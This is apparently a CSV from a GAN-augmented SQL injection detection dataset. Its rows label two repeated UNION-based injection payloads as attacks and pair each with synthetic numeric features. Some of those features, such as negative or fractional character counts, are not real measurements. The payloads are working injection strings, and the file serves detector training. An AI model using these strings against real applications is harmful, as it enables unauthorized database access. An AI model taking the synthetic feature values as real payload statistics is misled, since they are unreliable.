id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000156,attack,union,"-2549'  )   as zfnf where 1993  =  1993 union all select 1993,1993,1993,1993,1993,1993--",nearest_attack_euclidean,R000138,3.3341121535108926,77.26164245605469,25.989091873168945,23.272104263305664,12.677176475524902,-0.16215376555919647,31.88151741027832,12.60188102722168,1.2799015045166016,0.2545468807220459,0.32018616795539856,0.17219632863998413,0.13690556585788727,3.8840723037719727,0.9940260648727417,0.5359712839126587,2.6487293243408203,0.228633850812912,-0.017724642530083656,0.024411696940660477,0.4407918453216553,0.6196973919868469,4.247687816619873,0.023100227117538452,0.43208497762680054,0.1379307508468628,0.02946411818265915,0.012015069834887981,0.06626275926828384,0.32191184163093567,0.17779405415058136,0.05393066257238388,-0.032989658415317535,0.32584691047668457,1.0189728736877441,0.5874987840652466,-0.04170592129230499,-0.04036549851298332,1.2808018922805786,0.9960126280784607,1.0155874490737915,0.3086246848106384,0.1322452574968338,-0.22166010737419128,0.36799103021621704,-0.029584400355815887,-0.3599502444267273,0.19440896809101105,-0.0357196182012558,0.30134281516075134,-0.7523203492164612,0.1980592906475067,-0.07655472308397293,0.27342841029167175,-0.0016286922618746758,-0.4136245548725128,0.005076768342405558,0.0719435065984726,0.2962513566017151,0.19938747584819794,-0.016710631549358368,0.24130629003047943,-0.28360116481781006,0.0006237157504074275,0.3543468117713928,-0.02079717069864273,0.12779691815376282,0.18258655071258545,0.23810529708862305,-0.13697712123394012,-0.07476593554019928,-0.28396645188331604,-0.007430180907249451,0.14924468100070953,0.46757593750953674,0.4111752212047577,0.023001689463853836,-0.06972923874855042,-0.27049902081489563,-0.15892022848129272,-0.0548863559961319,3.5230045318603516,0.1617894470691681,1.2019431591033936,-0.2846526503562927,0.08941569924354553,-0.08371385931968689,0.3682795763015747,-0.0017753891879692674
GAN_000157,attack,union,"-2549'  )   as zfnf where 1993  =  1993 union all select 1993,1993,1993,1993,1993,1993--",nearest_attack_euclidean,R000138,2.9972921699302435,75.15045928955078,25.245262145996094,23.872215270996094,13.805113792419434,-0.3703979253768921,32.05724334716797,12.321155548095703,1.1843644380569458,0.2879163324832916,0.3399507403373718,0.18047593533992767,0.13729777932167053,3.9039876461029053,0.893862783908844,0.4244312345981598,2.524562358856201,0.26170599460601807,0.012567012570798397,0.09028077870607376,0.3746858537197113,0.7512561678886414,4.436264514923096,0.029008036479353905,0.4436585307121277,0.13263452053070068,-0.01543817762285471,0.009221593849360943,0.07893291115760803,0.2854361832141876,0.15781840682029724,-0.010821767151355743,-0.15596185624599457,0.1655573844909668,1.0255213975906372,0.6221619844436646,0.022021939978003502,0.05958806350827217,1.267741322517395,1.0606658458709717,0.7779955863952637,0.2264275699853897,-0.11256888508796692,-0.17954114079475403,0.16291910409927368,-0.10065468400716782,-0.28624457120895386,0.19547677040100098,0.12168044596910477,0.1416442096233368,-0.6600611805915833,-0.2133156806230545,-0.11991318315267563,0.13035643100738525,-0.09592993557453156,-0.4015744626522064,-0.0008312392164953053,0.07846690714359283,0.14197373390197754,0.13317856192588806,0.07920309156179428,0.04883095622062683,-0.237998828291893,-0.0001401287008775398,0.27780789136886597,0.053069714456796646,-0.035393182188272476,0.08683458715677261,0.17247627675533295,0.04789835214614868,-0.011728629469871521,-0.16023197770118713,0.04552525281906128,0.17254404723644257,0.4835160970687866,0.3261212408542633,0.03826882317662239,-0.009211951866745949,-0.10810712724924088,0.05885849893093109,-0.033532314002513885,3.241499423980713,0.14975063502788544,1.175411581993103,-0.3306058347225189,0.05960423871874809,-0.02371617965400219,0.32817724347114563,-0.0108802430331707
GAN_000158,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000197,2.9093098303461855,77.7650146484375,24.08684539794922,22.407941818237305,12.614684104919434,-0.02626507170498371,32.031551361083984,12.114378929138184,1.0312498807907104,0.3274417817592621,0.35149019956588745,0.1892801970243454,0.13596691191196442,3.92826509475708,0.6787710189819336,0.327072411775589,2.202653408050537,0.2878246009349823,-0.00228423485532403,0.0007483807276003063,0.36074522137641907,0.6980618238449097,3.159388542175293,0.02754475735127926,0.663305938243866,0.29333123564720154,0.0012290914310142398,0.06534019112586975,0.12416225671768188,0.2220856100320816,0.21089991927146912,-0.03804115206003189,-0.04164935648441315,0.01757185533642769,1.0362944602966309,0.7515918612480164,0.06543748080730438,0.2723604440689087,1.4082576036453247,1.0691553354263306,0.7806413769721985,0.21834661066532135,-0.07662321627140045,-0.023740805685520172,0.1788240671157837,-0.25213074684143066,-0.16549067199230194,0.03748638555407524,0.005534064024686813,0.1743101328611374,-0.37165728211402893,-0.27825605869293213,-0.2927014231681824,0.1356188803911209,0.06463969498872757,-0.22214767336845398,-0.007267492823302746,-0.07021092623472214,0.11881028860807419,0.23846253752708435,0.018892399966716766,0.01281832903623581,-0.0885336846113205,0.005586839281022549,0.44903141260147095,0.07091018557548523,0.12952859699726105,0.19604110717773438,-0.04778774455189705,-0.09286561608314514,0.15498420596122742,-0.1411668062210083,0.20710450410842896,-0.012685835361480713,0.27576470375061035,0.3026464581489563,0.01953553594648838,0.0775553286075592,-0.16873902082443237,0.18659549951553345,0.08044981211423874,3.4915223121643066,0.12443066388368607,1.0668596029281616,0.07034900784492493,0.03600586950778961,-0.07603894919157028,-0.045613642781972885,0.006351625546813011
GAN_000159,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000197,3.034323035604752,77.57539367675781,20.77247428894043,25.016748428344727,12.833209991455078,0.055878233164548874,33.6800422668457,12.076460838317871,0.9496331214904785,0.2848151922225952,0.3423382341861725,0.1838855892419815,0.13747936487197876,3.8820347785949707,0.6540469527244568,0.42433327436447144,2.463129758834839,0.36329424381256104,-0.011201483197510242,0.0010980067308992147,0.29849809408187866,0.799105167388916,3.2400219440460205,0.029276126995682716,0.6238588690757751,0.45548316836357117,-0.019674113020300865,0.06997495889663696,0.14959022402763367,0.2987436354160309,0.18481583893299103,-0.06534013152122498,0.008641742169857025,-0.02330419048666954,0.993692934513092,0.8586506843566895,0.0776369646191597,0.15200203657150269,1.3030081987380981,0.83673495054245,0.7976270914077759,0.23408573865890503,-0.03744305670261383,-0.10795532912015915,0.4344683289527893,-0.2306077778339386,-0.19659902155399323,0.09129847586154938,0.08980559557676315,0.22235873341560364,-0.43093341588974,-0.1681639403104782,-0.08599226921796799,0.38194602727890015,-0.005593203939497471,-0.13837149739265442,-0.0026198874693363905,0.21872802078723907,-0.02220217138528824,0.025532696396112442,0.23838847875595093,-0.01995990052819252,-0.29419320821762085,0.01041071955114603,0.36868441104888916,-0.01705954223871231,0.12209698557853699,0.16208496689796448,0.16771748661994934,0.14128565788269043,0.03467189520597458,-0.16441014409065247,-0.00149613618850708,0.11577264219522476,0.3854192793369293,0.38711920380592346,0.034623727202415466,0.022286219522356987,-0.14078056812286377,0.24703428149223328,0.24411991238594055,3.815979480743408,0.11800486594438553,1.1630254983901978,0.005458712577819824,-0.09917348623275757,-0.12727420032024384,0.06641647219657898,0.0026990624610334635
GAN_000160,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000197,3.3554390035989177,74.15478515625,20.95322608947754,24.018531799316406,11.671894073486328,-0.560901403427124,34.54347229003906,12.608304023742676,1.2033710479736328,0.287517786026001,0.3453560173511505,0.19248563051223755,0.13394412398338318,3.894948720932007,0.8509324193000793,0.416238009929657,2.378267526626587,0.2481064647436142,-0.020085282623767853,0.05752673000097275,0.4891766905784607,0.7421084046363831,3.2752068042755127,0.03231882303953171,0.4466417133808136,0.308281272649765,-0.0337105356156826,0.04445305094122887,0.15581876039505005,0.17454864084720612,0.2459225058555603,-0.04388421028852463,-0.21627135574817657,0.10448113083839417,0.9798195958137512,0.5962559580802917,-0.007843004539608955,0.07856583595275879,1.245221495628357,1.1182758808135986,1.0235615968704224,0.16829100251197815,-0.04447011649608612,-0.09082075208425522,0.3830205202102661,-0.2366667091846466,-0.23922714591026306,0.4996795058250427,0.12416774779558182,0.3044964373111725,-0.3132575750350952,-0.050524331629276276,-0.29244038462638855,0.1678539216518402,-0.005151009187102318,-0.3839522898197174,-0.012187372893095016,0.1818668097257614,0.09064111858606339,0.1695123016834259,0.12016502767801285,0.4014008641242981,-0.35719746351242065,0.009140738286077976,0.6022844314575195,0.2853454351425171,0.0012539327144622803,0.32423949241638184,0.055507972836494446,-0.31990885734558105,-0.15902692079544067,-0.40459683537483215,0.10341158509254456,-0.026275143027305603,0.2788251042366028,0.39828506112098694,0.005150085315108299,-0.14479759335517883,-0.21111446619033813,0.17915566265583038,-0.09465102851390839,2.8658571243286133,0.1461181938648224,1.0623754262924194,-0.4362696707248688,0.08609937131404877,-0.03957809507846832,0.12953276932239532,-0.01654026284813881
GAN_000161,attack,union,"-2549'  )   as zfnf where 1993  =  1993 union all select 1993,1993,1993,1993,1993,1993--",nearest_attack_euclidean,R000138,3.090161342851595,78.12057495117188,23.108274459838867,26.317739486694336,13.527359008789062,-0.5317460298538208,31.709775924682617,12.381165504455566,1.253861427307129,0.31821075081825256,0.33691197633743286,0.1849452555179596,0.14029771089553833,3.938837766647339,1.1863654851913452,0.42487600445747375,2.479342460632324,0.3673913776874542,0.02162349782884121,0.049977175891399384,0.49530959129333496,0.6540718078613281,4.429450988769531,0.016739416867494583,0.5102904438972473,0.22593948245048523,0.0065262457355856895,0.008132155053317547,0.16373871266841888,0.3867705464363098,0.223277285695076,-0.3083493709564209,0.09262815117835999,0.11837230622768402,1.0030394792556763,0.8292019963264465,0.08974167704582214,0.09146839380264282,1.3739255666732788,0.929140567779541,0.9700192213058472,0.10695184767246246,0.061228953301906586,-0.07672291249036789,0.16319894790649414,-0.018430866301059723,-0.19224640727043152,0.10049927234649658,0.26990434527397156,0.3787875473499298,-0.5763948559761047,-0.14055047929286957,-0.0525764599442482,-0.016270965337753296,-0.1546807885169983,-0.2837645709514618,0.005051706451922655,0.11786781251430511,0.09070193022489548,0.2639404237270355,-0.024518035352230072,0.2322559505701065,-0.1434316188097,0.008256127126514912,-0.020892033353447914,0.016579698771238327,-0.05546790361404419,0.14648312330245972,0.10530087351799011,0.012363187968730927,-0.13996294140815735,-0.023044608533382416,0.21003329753875732,0.24352389574050903,0.3985784947872162,0.30130475759506226,0.0203887689858675,0.007398358080536127,-0.19515225291252136,0.2180081009864807,-0.18022143840789795,3.9556872844696045,0.11822830885648727,1.0861912965774536,-0.010516367852687836,0.15004804730415344,-0.007940376177430153,0.3790687620639801,0.0021865624003112316
GAN_000162,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000197,2.6286919958738455,77.5430908203125,25.769926071166992,25.442739486694336,13.116353034973145,0.25339198112487793,31.532859802246094,11.763738632202148,1.2208151817321777,0.3160163462162018,0.3241838812828064,0.17568282783031464,0.13777007162570953,3.9448297023773193,0.9007167220115662,0.313314825296402,2.385429859161377,0.2472616583108902,-0.003420656081289053,0.03434335067868233,0.3167444169521332,0.7039269208908081,4.002434730529785,0.02310885861515999,0.6415654420852661,0.21697908639907837,0.020289147272706032,0.16228409111499786,0.13793735206127167,0.2892272472381592,0.23135164380073547,-0.11297804862260818,0.006978809833526611,0.14519472420215607,1.0224218368530273,0.7862354516983032,0.032985247671604156,0.124272421002388,1.3152806758880615,0.8899505138397217,0.8350511193275452,0.2766033411026001,0.05517791211605072,-0.15387755632400513,0.09315679967403412,0.019100762903690338,-0.2910367250442505,0.12348069250583649,0.07119375467300415,0.047245804220438004,-0.34904125332832336,-0.06111132353544235,-0.23344454169273376,0.11391228437423706,0.1241435557603836,-0.066105917096138,-0.0021710859145969152,0.038375262171030045,0.06515903025865555,0.10699068009853363,0.06802792102098465,0.20916436612606049,-0.03781042993068695,0.0030517817940562963,0.19264386594295502,8.370727300643921e-05,-0.004868857562541962,-0.004548199474811554,0.0874948650598526,-0.1223379522562027,0.011327829211950302,-0.18684041500091553,-0.005986519157886505,0.03226696699857712,0.1840774416923523,0.3431429862976074,0.019903797656297684,0.03560108691453934,-0.09052961319684982,-0.04490356147289276,-0.08896659314632416,3.6910743713378906,0.0980788841843605,1.2478344440460205,-0.042895711958408356,-0.011066146194934845,-0.24220219254493713,0.094313845038414,0.0037088729441165924
GAN_000163,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000197,2.875930092894896,75.60944366455078,25.23213005065918,24.784021377563477,13.443246841430664,-0.019209789112210274,31.287439346313477,11.959522247314453,0.9372915029525757,0.3045329749584198,0.3240926265716553,0.1927012950181961,0.13341976702213287,3.8832809925079346,0.7365524172782898,0.4671069085597992,2.59873104095459,0.24827854335308075,0.0276196151971817,0.025705210864543915,0.29389891028404236,0.7976239323616028,3.9048051834106445,0.031137235462665558,0.5049099922180176,0.3379664421081543,0.007202259264886379,0.08386921882629395,0.26282644271850586,0.26028165221214294,0.18716636300086975,-0.033685192465782166,-0.059804871678352356,0.054675519466400146,1.0209736824035645,0.7450095415115356,0.03188478201627731,0.2636103928089142,1.3007020950317383,0.8131033182144165,0.8194631338119507,0.20330402255058289,-0.09346197545528412,0.025735367089509964,0.12539176642894745,-0.23281866312026978,-0.20055630803108215,0.3164505958557129,0.11489082127809525,0.14938673377037048,-0.3112867772579193,-0.2424042671918869,-0.2038174867630005,0.320372611284256,-0.03009006567299366,-0.06774875521659851,0.0032599635887891054,0.22603781521320343,-0.05550374835729599,0.0867159366607666,0.2094925343990326,0.07102392613887787,-0.33425265550613403,0.00423582224175334,0.4671716094017029,-0.038096874952316284,0.05457693338394165,0.07527927309274673,0.16938765347003937,0.008739039301872253,0.011275656521320343,-0.33135515451431274,0.022865869104862213,0.04933597892522812,0.34804126620292664,0.3128947913646698,0.037946876138448715,-0.014916421845555305,0.008508071303367615,0.045730821788311005,-0.19000205397605896,3.160255193710327,0.07924230396747589,1.0458346605300903,-0.16251987218856812,0.048142679035663605,0.023568101227283478,-0.1273583024740219,-0.0021477271802723408
GAN_000164,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000197,2.985438724195769,79.47610473632812,25.62763786315918,23.81662368774414,14.05142593383789,-0.4143959879875183,32.010643005371094,12.145636558532715,0.8048672676086426,0.3505227267742157,0.3503836989402771,0.18698133528232574,0.13619975745677948,3.9798836708068848,1.0983765125274658,0.33330488204956055,2.297572374343872,0.25853443145751953,0.018678540363907814,0.08799611777067184,0.3398517668247223,0.633324921131134,4.27040958404541,0.021166875958442688,0.49618014693260193,0.22955873608589172,-3.6195971915731207e-05,0.0136762959882617,0.21113909780979156,0.2622970640659332,0.21556755900382996,-0.26059067249298096,0.15049132704734802,0.003489173948764801,1.0301307439804077,0.668093204498291,0.07905697822570801,0.4042156934738159,1.4364503622055054,0.9577229619026184,0.7693801522254944,0.14351330697536469,0.008618034422397614,0.03644570708274841,0.06395037472248077,-0.19247031211853027,0.08062295615673065,0.1161135584115982,0.1681542694568634,0.326880544424057,-0.28018108010292053,-0.25394269824028015,-0.004695683717727661,-0.10030047595500946,-0.1884949952363968,-0.061647459864616394,0.00035118378582410514,0.0900687575340271,0.053414009511470795,0.3518550395965576,-0.10388790816068649,-0.03105112537741661,0.0205833837389946,0.013899542391300201,0.08721282333135605,-0.07960117608308792,-0.1370263397693634,0.17493975162506104,0.09468355774879456,0.07026322185993195,0.03515005484223366,-0.14903342723846436,0.25392064452171326,0.058221638202667236,0.20843958854675293,0.20553705096244812,0.03104615956544876,0.09580505639314651,-0.1566111147403717,0.14470358192920685,-0.028519414365291595,3.441009998321533,0.14799396693706512,1.0700130462646484,0.08287684619426727,0.19269579648971558,0.19412761926651,-0.102709099650383,0.012490097433328629
GAN_000165,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000197,2.8279532306124637,77.78741455078125,24.971487045288086,23.471166610717773,12.590985298156738,0.03167219087481499,32.14556121826172,11.935168266296387,1.0919774770736694,0.30606958270072937,0.3292861878871918,0.1813780963420868,0.13690747320652008,3.9179599285125732,0.8118790984153748,0.34885311126708984,2.325479745864868,0.26935771107673645,6.007646879879758e-05,-0.03194780275225639,0.35838761925697327,0.6695395112037659,3.1033060550689697,0.02649112604558468,0.627877414226532,0.29851117730140686,0.006728111766278744,0.07435621321201324,0.15370213985443115,0.2694506347179413,0.22169280052185059,-0.10431009531021118,0.02360500767827034,0.06677676737308502,1.0077482461929321,0.7204784750938416,0.07087348401546478,0.20341408252716064,1.3754175901412964,0.9607197046279907,0.8384974002838135,0.23146574199199677,0.035383135080337524,-0.06418443471193314,0.22286540269851685,-0.1953868567943573,-0.14788199961185455,0.0029344111680984497,0.011007178574800491,0.224663645029068,-0.3080088496208191,-0.13544055819511414,-0.16869595646858215,0.18214577436447144,0.06968671083450317,-0.17479249835014343,-0.0036233568098396063,-0.015604628250002861,0.03615296632051468,0.24148932099342346,0.022588655352592468,0.11086612939834595,-0.0674201250076294,0.004132483154535294,0.44093063473701477,0.10711492598056793,0.11089377105236053,0.16522234678268433,-0.018076147884130478,-0.09878964722156525,-0.006678320467472076,-0.1697620153427124,0.14888010919094086,-0.005998149514198303,0.24936792254447937,0.34897440671920776,0.014722196385264397,0.014520501717925072,-0.10922495275735855,0.14264367520809174,0.040809642523527145,3.6733198165893555,0.11733726412057877,1.0664325952529907,0.065925732254982,0.15208052098751068,-0.04662810266017914,0.003339651972055435,0.006645286921411753
GAN_000166,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000197,3.227700913898571,75.69746398925781,19.017993927001953,25.660865783691406,12.342118263244629,-0.5380134582519531,35.17768478393555,12.365262031555176,1.020639181137085,0.2810176610946655,0.36361774802207947,0.1869453340768814,0.1371082365512848,3.876108169555664,0.6825307011604309,0.39412420988082886,2.322787046432495,0.3795674443244934,-0.0281938798725605,0.017912250012159348,0.35445985198020935,0.820012092590332,3.1180953979492188,0.027007348835468292,0.5681586265563965,0.3918937146663666,-0.04217285290360451,0.0372418574988842,0.09872090071439743,0.24664588272571564,0.22220396995544434,-0.09308277070522308,-0.16028240323066711,-0.021562207490205765,0.9989195466041565,0.8106284737586975,0.06421360373497009,0.13097405433654785,1.2733039855957031,1.0185335874557495,0.83961021900177,0.16687554121017456,-0.18387602269649506,-0.16459903120994568,0.47478216886520386,-0.20719894766807556,-0.22853177785873413,0.16644152998924255,0.10398677736520767,0.3255266845226288,-0.524920642375946,-0.28139349818229675,-0.18945404887199402,0.27562496066093445,-0.031183477491140366,-0.248457133769989,-0.004732334986329079,0.3385638892650604,0.04406117647886276,0.27007558941841125,0.20181098580360413,0.04930746555328369,-0.32716047763824463,0.013162219896912575,0.4717302620410919,0.15054729580879211,0.17409846186637878,0.2570391893386841,0.02906489185988903,-0.06667344272136688,-0.009164415299892426,-0.18372565507888794,0.14336329698562622,0.0497417226433754,0.3713603615760803,0.38411760330200195,0.030556632205843925,0.03052682988345623,-0.22606468200683594,0.3484920859336853,0.09789388626813889,3.512112617492676,0.15750539302825928,1.1817994117736816,-0.10806556791067123,-0.14071893692016602,-0.14332816004753113,0.08239956200122833,-0.009859511628746986
GAN_000167,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000197,2.789638312345618,77.46102905273438,24.682558059692383,25.847949981689453,12.773738861083984,-0.05318586900830269,31.31606674194336,11.802765846252441,0.9185789823532104,0.2925698757171631,0.3178793489933014,0.18016666173934937,0.13687624037265778,3.9360785484313965,0.9576864838600159,0.35345029830932617,2.451308488845825,0.24576376378536224,0.015236574225127697,0.019973423331975937,0.3520149886608124,0.7679158449172974,3.7844290733337402,0.020205510780215263,0.5263147950172424,0.32002031803131104,0.01219985168427229,0.0950809195637703,0.26242756843566895,0.3270608186721802,0.21509505808353424,-0.1528959572315216,-0.08358091115951538,0.1603975147008896,0.9915345311164856,0.7759870886802673,0.0688578337430954,0.21269336342811584,1.291634202003479,0.7828795909881592,0.8678175806999207,0.30436041951179504,0.1590179204940796,-0.10332710295915604,0.21647214889526367,-0.12874320149421692,-0.1265851855278015,0.19060872495174408,0.13110628724098206,0.23313139379024506,-0.17975081503391266,-0.08781517297029495,-0.0847993865609169,0.17131417989730835,-0.028443900868296623,0.04231903702020645,-0.0003582118370104581,0.2162385731935501,-0.19673040509223938,0.22678253054618835,0.11596671491861343,0.1130707859992981,-0.16266371309757233,0.004904628731310368,0.3261967599391937,0.037765804678201675,-0.07522871345281601,0.09327090531587601,0.0828777551651001,-0.0063662901520729065,-0.09773047268390656,-0.26696550846099854,0.0844137892127037,0.0319986492395401,0.19211986660957336,0.34369581937789917,0.024558162316679955,-0.03443579375743866,-0.08580263704061508,0.1054430678486824,-0.06369088590145111,3.5933926105499268,0.12055154889822006,1.1725013256072998,-0.09548487514257431,0.09350384771823883,0.00036757439374923706,0.012452170252799988,0.006478005554527044
GAN_000168,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000197,3.0189467565163866,76.75127410888672,21.755144119262695,23.904346466064453,13.654132843017578,-0.045718658715486526,35.11759567260742,12.399087905883789,0.9666782021522522,0.2942538559436798,0.3507062792778015,0.17373549938201904,0.1352664828300476,3.9389989376068115,0.7930922508239746,0.3415206968784332,2.3034985065460205,0.3203783333301544,-0.01631823368370533,0.020932599902153015,0.3707275092601776,0.7321960926055908,3.67069935798645,0.023971470072865486,0.5355543494224548,0.29189521074295044,-0.02569044940173626,-0.007395748980343342,0.15002389252185822,0.2825447618961334,0.26801714301109314,-0.20374947786331177,0.13832005858421326,-0.03416438028216362,1.0166269540786743,0.7396793961524963,0.09689623862504959,0.19913606345653534,1.3155760765075684,0.9587214589118958,0.888984203338623,0.20372170209884644,0.0072807446122169495,-0.05783046782016754,0.3305932283401489,-0.21525788307189941,0.004345715045928955,-0.05606566742062569,0.2603401839733124,0.4021468162536621,-0.47248023748397827,-0.3169165849685669,0.06747591495513916,0.09575207531452179,-0.11098770052194595,-0.1869329810142517,0.0003458989958744496,0.07964938879013062,0.009847216308116913,0.3396513760089874,0.08374208956956863,0.07554611563682556,-0.017951354384422302,0.004630083683878183,0.2824314832687378,0.061997171491384506,0.00023689866065979004,0.20496395230293274,0.07440121471881866,-0.03141248971223831,-0.21120081841945648,-0.08046182245016098,0.16519230604171753,0.028870753943920135,0.26022011041641235,0.3152961730957031,0.030048104003071785,0.04480147361755371,-0.15314766764640808,0.2764184772968292,0.12498755007982254,3.7694265842437744,0.16143226623535156,1.1780868768692017,0.0695587545633316,0.031336694955825806,0.04542500525712967,0.15287868678569794,0.015240191482007504
GAN_000169,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000197,3.1997138652233654,74.84590911865234,23.982715606689453,24.347803115844727,13.890594482421875,-0.44101929664611816,32.93195343017578,12.436744689941406,0.8570082187652588,0.2742268741130829,0.34821611642837524,0.1858026683330536,0.13244940340518951,3.9340741634368896,0.944033145904541,0.48500579595565796,2.4986183643341064,0.33257731795310974,0.026809534057974815,0.03679482266306877,0.42290955781936646,0.8679579496383667,4.351280212402344,0.017018267884850502,0.4104350805282593,0.46490857005119324,-0.015057907439768314,-0.05912290886044502,0.21157540380954742,0.37541335821151733,0.24897213280200958,-0.23577973246574402,0.02085043489933014,0.006525889039039612,1.0356589555740356,0.6993910074234009,0.05758294835686684,0.1449929028749466,1.3035534620285034,0.8152064085006714,0.9165790677070618,0.15826168656349182,-0.09399701654911041,0.03141938894987106,0.2108490765094757,-0.20049527287483215,-0.04620795696973801,0.07685838639736176,0.4467165470123291,0.48379120230674744,-0.572554349899292,-0.36364829540252686,0.27039605379104614,0.18600481748580933,-0.20668797194957733,-0.08610232174396515,0.003024108475074172,0.08614861965179443,-0.028647340834140778,0.20857563614845276,0.22693580389022827,-0.0023715831339359283,-0.1112348884344101,0.0013890769332647324,0.113810695707798,-0.1261930763721466,-0.0638558641076088,0.1555558443069458,0.18509308993816376,0.12957265973091125,-0.18127357959747314,-0.11133300513029099,0.1619015634059906,0.17998388409614563,0.3578150272369385,0.2221250683069229,0.04814690724015236,0.03852277994155884,-0.19206714630126953,0.05340517312288284,0.06997239589691162,3.2784767150878906,0.17710481584072113,1.0916175842285156,0.068574920296669,0.14631205797195435,0.2594790458679199,0.23704242706298828,0.014588993974030018
GAN_000170,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000197,3.1334700262933333,74.56458282470703,21.40351676940918,23.74454116821289,13.935376167297363,0.0647927075624466,33.54783630371094,12.106099128723145,0.7815526723861694,0.30079686641693115,0.3498678207397461,0.18407858908176422,0.13330386579036713,3.948937177658081,0.6553658843040466,0.3923720419406891,2.390129804611206,0.3313867449760437,0.02948402799665928,0.02450987696647644,0.366443932056427,0.7619869112968445,3.4825010299682617,0.026425745338201523,0.5737184882164001,0.5914468169212341,0.00618331041187048,0.07244763523340225,0.3133566975593567,0.3516922891139984,0.2558167576789856,-0.3312690556049347,0.05163394659757614,-0.10479775071144104,0.997950553894043,0.8261324167251587,0.07545946538448334,0.25097405910491943,1.3480174541473389,0.677285373210907,0.9076041579246521,0.1879570633172989,0.04780266806483269,0.05508038029074669,0.2697208523750305,-0.35166651010513306,0.006892472505569458,0.08020596206188202,0.3122575879096985,0.367590993642807,-0.15813593566417694,-0.3990573287010193,0.058669313788414,0.2090434730052948,-0.0780629888176918,0.024810798466205597,-0.0033057949040085077,0.07052214443683624,-0.27181705832481384,0.169869065284729,0.27515268325805664,-0.04638633131980896,-0.1746293157339096,0.0017822941299527884,0.3307112753391266,0.06904949247837067,-0.10058782994747162,0.20299679040908813,0.06956562399864197,0.10330352187156677,-0.16299928724765778,-0.24955731630325317,0.1261604130268097,-0.10907818377017975,0.279612272977829,0.28634846210479736,0.03796994686126709,0.005512929055839777,-0.08347786217927933,0.30072084069252014,-0.0010101571679115295,3.569324493408203,0.12801507115364075,1.0715851783752441,0.07024022191762924,0.10693614184856415,0.054686009883880615,-0.018160948529839516,0.01620197482407093
